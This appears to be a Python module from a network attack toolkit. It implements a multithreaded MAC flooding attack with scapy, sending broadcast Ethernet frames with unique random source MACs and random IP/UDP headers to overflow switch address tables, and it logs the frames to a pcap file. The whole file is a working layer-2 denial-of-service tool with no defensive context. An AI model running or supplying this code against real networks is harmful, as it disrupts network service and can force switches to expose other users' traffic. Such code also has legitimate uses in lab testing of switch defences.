import random, threading, time
from scapy.all import Ether, IP, UDP, sendp
from attacks.base import BaseAttack


class MacFlood(BaseAttack):
    def run(self):
        threads_n = int(self.params.get("threads", 6))
        mac_pool  = set()
        pool_lock = threading.Lock()
        counters  = {"sent": 0}
        writer    = self.open_pcap()

        def unique_mac():
            while True:
                o = [random.randint(0, 255) for _ in range(6)]
                o[0] = (o[0] & 0xFE) | 0x02
                mac = ":".join(f"{b:02x}" for b in o)
                with pool_lock:
                    if mac not in mac_pool:
                        mac_pool.add(mac)
                        return mac

        def sender():
            while not self._stop.is_set():
                src = unique_mac()
                pkt = (
                    Ether(src=src, dst="ff:ff:ff:ff:ff:ff")
                    / IP(src=f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
                         dst=f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}")
                    / UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 1023))
                )
                try:
                    sendp(pkt, iface=self.iface, verbose=False)
                    with pool_lock:
                        self.write(pkt)
                        counters["sent"] += 1
                        n = counters["sent"]
                    if n % 500 == 0:
                        self.log(f"MAC Flood: {n:,} frames | {len(mac_pool):,} unique MACs", "info")
                except Exception as e:
                    self.log(f"MAC Flood error: {e}", "error"); break

        workers = [threading.Thread(target=sender, daemon=True) for _ in range(threads_n)]
        for w in workers: w.start()
        for w in workers: w.join()
        writer.close()
        self.log(f"MAC Flood: finished — {counters['sent']:,} frames, {len(mac_pool):,} MACs", "success")
